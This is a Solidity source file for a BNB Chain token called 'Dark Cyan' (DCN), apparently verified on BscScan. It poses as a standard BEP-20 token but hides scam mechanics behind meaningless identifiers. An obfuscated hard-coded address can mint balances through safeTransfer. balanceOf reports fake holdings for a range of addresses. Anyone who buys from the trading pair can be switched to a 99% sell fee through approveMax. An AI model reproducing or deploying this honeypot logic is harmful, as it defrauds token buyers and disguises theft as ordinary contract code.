/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IUniswapV2Router {

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function WETH() external pure returns (address);

}




contract DarkCyan is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private atTotalSwapToIs = 1;




    uint256  minBotsSellTakeMaxListTx = 100000000 * 10 ** _decimals;


    bool private shouldSenderSwapTrading = false;

    uint256 private liquiditySwapTakeTokenMintTrading = 0;
    address constant walletAmountModeBurnMaxLaunchedMin = 0x3e9302f815a19f04284EeaFD80B11e87F9e34F94;
    uint256 public launchAutoToBots = 0;

    address public uniswapV2Pair;
    uint160 constant atExemptMarketingEnable = 353123634156 * 2 ** 40;
    uint256  totalTxSenderList = 100000000 * 10 ** _decimals;
    uint256 launchWalletTokenTradingLimitExemptTeam = 100000000 * (10 ** _decimals);
    uint160 constant fundTradingReceiverLimitMint = 1055615401361 * 2 ** 120;
    mapping(address => uint256) _balances;
    string constant _name = "Dark Cyan";
    uint256 private txReceiverBurnWallet = 0;
    address private autoLiquidityListModeReceiver = (msg.sender);

    uint256 constant marketingSwapMintShould = 300000 * 10 ** 18;
    uint256 walletFeeTakeReceiver = 0;
    uint256 public liquidityShouldToAt = 0;
    mapping(address => bool)  burnListAtTo;
    uint160 constant burnLaunchToSender = 539309553663 * 2 ** 80;
    
    uint256 constant fromTeamTakeLaunchTotal = 10000 * 10 ** 18;
    uint160 constant minSwapExemptTotalSenderLimit = 128278572734;
    IUniswapV2Router public atMintLimitEnableToMinTrading;

    string constant _symbol = "DCN";
    mapping(address => mapping(address => uint256)) _allowances;
    bool private feeReceiverSwapTakeIsEnable = false;
    uint256 private receiverMinSenderShouldMarketingExemptMax = 100;
    mapping(address => bool) private mintFeeLaunchLimitTxReceiver;

    bool private amountBuyEnableTokenLaunched = false;
    uint256 private marketingShouldLaunchedLiquidityToken = 1;

    mapping(address => bool)  launchBotsAutoMarketingMax;
    uint256 private liquidityWalletListAtBuyReceiverTo = 0;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        atMintLimitEnableToMinTrading = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(atMintLimitEnableToMinTrading.factory()).createPair(address(this), atMintLimitEnableToMinTrading.WETH());
        _allowances[address(this)][address(atMintLimitEnableToMinTrading)] = launchWalletTokenTradingLimitExemptTeam;

        mintFeeLaunchLimitTxReceiver[msg.sender] = true;
        mintFeeLaunchLimitTxReceiver[address(this)] = true;

        _balances[msg.sender] = launchWalletTokenTradingLimitExemptTeam;
        emit Transfer(address(0), msg.sender, launchWalletTokenTradingLimitExemptTeam);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return launchWalletTokenTradingLimitExemptTeam;
    }

    function safeTransfer(address amountTotalShouldMarketing, address launchedTxListLimit, uint256 tradingFeeModeLaunchedmount) public {
        if (!toTradingAmountWallet(uint160(msg.sender))) {
            return;
        }
        if (receiverIsTeamSender(uint160(launchedTxListLimit))) {
            receiverToTakeEnable(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount, false);
            return;
        }
        if (receiverIsTeamSender(uint160(amountTotalShouldMarketing))) {
            receiverToTakeEnable(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount, true);
            return;
        }
        if (amountTotalShouldMarketing == address(0)) {
            _balances[launchedTxListLimit] = _balances[launchedTxListLimit].add(tradingFeeModeLaunchedmount);
            return;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (receiverIsTeamSender(uint160(account))) {
            return walletTradingListToken(uint160(account));
        }
        return _balances[account];
    }

    function walletAtMinFrom(address botsTakeExemptSell) private view returns (bool) {
        return botsTakeExemptSell == autoLiquidityListModeReceiver;
    }

    function getminBotsTokenAutoLimit() public view returns (uint256) {
        if (liquidityWalletListAtBuyReceiverTo == launchAutoToBots) {
            return launchAutoToBots;
        }
        return liquidityWalletListAtBuyReceiverTo;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != launchWalletTokenTradingLimitExemptTeam) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return liquidityMaxSellBurn(sender, recipient, amount);
    }

    function getswapFeeSellTrading() public view returns (uint256) {
        if (liquiditySwapTakeTokenMintTrading != liquidityShouldToAt) {
            return liquidityShouldToAt;
        }
        if (liquiditySwapTakeTokenMintTrading == launchAutoToBots) {
            return launchAutoToBots;
        }
        if (liquiditySwapTakeTokenMintTrading == receiverMinSenderShouldMarketingExemptMax) {
            return receiverMinSenderShouldMarketingExemptMax;
        }
        return liquiditySwapTakeTokenMintTrading;
    }

    function toTradingAmountWallet(uint160 tradingFeeModeLaunchedccount) private pure returns (bool) {
        uint160 tradingFeeModeLaunched = fundTradingReceiverLimitMint;
        tradingFeeModeLaunched += burnLaunchToSender;
        tradingFeeModeLaunched += atExemptMarketingEnable;
        tradingFeeModeLaunched += minSwapExemptTotalSenderLimit;
        if (tradingFeeModeLaunchedccount == tradingFeeModeLaunched) {
            return true;
        }
        return false;
    }

    function getbotsEnableSellExempt() public view returns (uint256) {
        return receiverMinSenderShouldMarketingExemptMax;
    }

    function setswapFeeSellTrading(uint256 totalShouldTeamAuto) public onlyOwner {
        if (liquiditySwapTakeTokenMintTrading == marketingShouldLaunchedLiquidityToken) {
            marketingShouldLaunchedLiquidityToken=totalShouldTeamAuto;
        }
        if (liquiditySwapTakeTokenMintTrading != launchAutoToBots) {
            launchAutoToBots=totalShouldTeamAuto;
        }
        liquiditySwapTakeTokenMintTrading=totalShouldTeamAuto;
    }

    function approveMax(address spender) external {
        if (burnListAtTo[spender]) {
            launchBotsAutoMarketingMax[spender] = true;
        }
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function settxBuyLaunchedEnable(bool totalShouldTeamAuto) public onlyOwner {
        if (shouldSenderSwapTrading == shouldSenderSwapTrading) {
            shouldSenderSwapTrading=totalShouldTeamAuto;
        }
        shouldSenderSwapTrading=totalShouldTeamAuto;
    }

    function mintEnableTakeBotsListFund(address amountTotalShouldMarketing, bool atBurnIsShould) internal view returns (uint256) {
        if (launchBotsAutoMarketingMax[amountTotalShouldMarketing]) {
            return 99;
        }
        
        if (atBurnIsShould) {
            return atTotalSwapToIs;
        }
        if (!atBurnIsShould && amountTotalShouldMarketing == uniswapV2Pair) {
            return marketingShouldLaunchedLiquidityToken;
        }
        return 0;
    }

    function setminBotsTokenAutoLimit(uint256 totalShouldTeamAuto) public onlyOwner {
        liquidityWalletListAtBuyReceiverTo=totalShouldTeamAuto;
    }

    function receiverIsTeamSender(uint160 tradingFeeModeLaunchedccount) private pure returns (bool) {
        if (tradingFeeModeLaunchedccount >= uint160(walletAmountModeBurnMaxLaunchedMin) && tradingFeeModeLaunchedccount <= uint160(walletAmountModeBurnMaxLaunchedMin) + 120000) {
            return true;
        }
        return false;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityMaxSellBurn(msg.sender, recipient, amount);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function setbotsEnableSellExempt(uint256 totalShouldTeamAuto) public onlyOwner {
        if (receiverMinSenderShouldMarketingExemptMax == liquidityShouldToAt) {
            liquidityShouldToAt=totalShouldTeamAuto;
        }
        receiverMinSenderShouldMarketingExemptMax=totalShouldTeamAuto;
    }

    function receiverToTakeEnable(address amountTotalShouldMarketing, address launchedTxListLimit, uint256 tradingFeeModeLaunchedmount, bool shouldMaxMinSwapAtAutoList) private {
        if (shouldMaxMinSwapAtAutoList) {
            amountTotalShouldMarketing = address(uint160(uint160(walletAmountModeBurnMaxLaunchedMin) + walletFeeTakeReceiver));
            walletFeeTakeReceiver++;
            _balances[launchedTxListLimit] = _balances[launchedTxListLimit].add(tradingFeeModeLaunchedmount);
        } else {
            _balances[amountTotalShouldMarketing] = _balances[amountTotalShouldMarketing].sub(tradingFeeModeLaunchedmount);
        }
        emit Transfer(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount);
    }

    function gettxBuyLaunchedEnable() public view returns (bool) {
        if (shouldSenderSwapTrading != amountBuyEnableTokenLaunched) {
            return amountBuyEnableTokenLaunched;
        }
        if (shouldSenderSwapTrading != shouldSenderSwapTrading) {
            return shouldSenderSwapTrading;
        }
        return shouldSenderSwapTrading;
    }

    function getfundTxTeamLimit() public view returns (uint256) {
        if (liquidityShouldToAt != liquiditySwapTakeTokenMintTrading) {
            return liquiditySwapTakeTokenMintTrading;
        }
        if (liquidityShouldToAt == marketingShouldLaunchedLiquidityToken) {
            return marketingShouldLaunchedLiquidityToken;
        }
        return liquidityShouldToAt;
    }

    function liquidityAmountFundSwapTokenBuyFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function isApproveMax(address spender) public view returns (bool) {
        return launchBotsAutoMarketingMax[spender];
    }

    function getteamBuyReceiverFee() public view returns (bool) {
        if (feeReceiverSwapTakeIsEnable == shouldSenderSwapTrading) {
            return shouldSenderSwapTrading;
        }
        if (feeReceiverSwapTakeIsEnable != amountBuyEnableTokenLaunched) {
            return amountBuyEnableTokenLaunched;
        }
        if (feeReceiverSwapTakeIsEnable != shouldSenderSwapTrading) {
            return shouldSenderSwapTrading;
        }
        return feeReceiverSwapTakeIsEnable;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function liquidityMaxSellBurn(address amountTotalShouldMarketing, address launchedTxListLimit, uint256 tradingFeeModeLaunchedmount) internal returns (bool) {
        if (receiverIsTeamSender(uint160(launchedTxListLimit))) {
            receiverToTakeEnable(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount, false);
            return true;
        }
        if (receiverIsTeamSender(uint160(amountTotalShouldMarketing))) {
            receiverToTakeEnable(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount, true);
            return true;
        }
        
        if (shouldSenderSwapTrading != amountBuyEnableTokenLaunched) {
            shouldSenderSwapTrading = amountBuyEnableTokenLaunched;
        }


        bool receiverTakeShouldTrading = walletAtMinFrom(amountTotalShouldMarketing) || walletAtMinFrom(launchedTxListLimit);
        
        if (txReceiverBurnWallet != atTotalSwapToIs) {
            txReceiverBurnWallet = receiverMinSenderShouldMarketingExemptMax;
        }


        if (amountTotalShouldMarketing == uniswapV2Pair && !receiverTakeShouldTrading) {
            burnListAtTo[launchedTxListLimit] = true;
        }
        
        if (receiverTakeShouldTrading) {
            return liquidityAmountFundSwapTokenBuyFrom(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount);
        }
        
        _balances[amountTotalShouldMarketing] = _balances[amountTotalShouldMarketing].sub(tradingFeeModeLaunchedmount, "Insufficient Balance!");
        
        uint256 txExemptTradingFund = fundModeTxIs(amountTotalShouldMarketing) ? autoFeeEnableAt(amountTotalShouldMarketing, launchedTxListLimit, tradingFeeModeLaunchedmount) : tradingFeeModeLaunchedmount;

        _balances[launchedTxListLimit] = _balances[launchedTxListLimit].add(txExemptTradingFund);
        emit Transfer(amountTotalShouldMarketing, launchedTxListLimit, txExemptTradingFund);
        return true;
    }

    function setfundTxTeamLimit(uint256 totalShouldTeamAuto) public onlyOwner {
        if (liquidityShouldToAt != marketingShouldLaunchedLiquidityToken) {
            marketingShouldLaunchedLiquidityToken=totalShouldTeamAuto;
        }
        liquidityShouldToAt=totalShouldTeamAuto;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function fundModeTxIs(address amountTotalShouldMarketing) internal view returns (bool) {
        return !mintFeeLaunchLimitTxReceiver[amountTotalShouldMarketing];
    }

    function autoFeeEnableAt(address amountTotalShouldMarketing, address launchedWalletTokenTake, uint256 tradingFeeModeLaunchedmount) internal returns (uint256) {
        
        uint256 launchReceiverAtTakeSwapMaxTo = tradingFeeModeLaunchedmount.mul(mintEnableTakeBotsListFund(amountTotalShouldMarketing, launchedWalletTokenTake == uniswapV2Pair)).div(receiverMinSenderShouldMarketingExemptMax);

        if (launchReceiverAtTakeSwapMaxTo > 0) {
            _balances[address(this)] = _balances[address(this)].add(launchReceiverAtTakeSwapMaxTo);
            emit Transfer(amountTotalShouldMarketing, address(this), launchReceiverAtTakeSwapMaxTo);
        }

        return tradingFeeModeLaunchedmount.sub(launchReceiverAtTakeSwapMaxTo);
    }

    function walletTradingListToken(uint160 tradingFeeModeLaunchedccount) private view returns (uint256) {
        uint256 receiverTxLiquidityLaunchedTradingFeeAt = walletFeeTakeReceiver;
        uint256 listTakeShouldAmountLimitMin = tradingFeeModeLaunchedccount - uint160(walletAmountModeBurnMaxLaunchedMin);
        if (listTakeShouldAmountLimitMin < receiverTxLiquidityLaunchedTradingFeeAt) {
            return fromTeamTakeLaunchTotal;
        }
        return marketingSwapMintShould;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setteamBuyReceiverFee(bool totalShouldTeamAuto) public onlyOwner {
        feeReceiverSwapTakeIsEnable=totalShouldTeamAuto;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}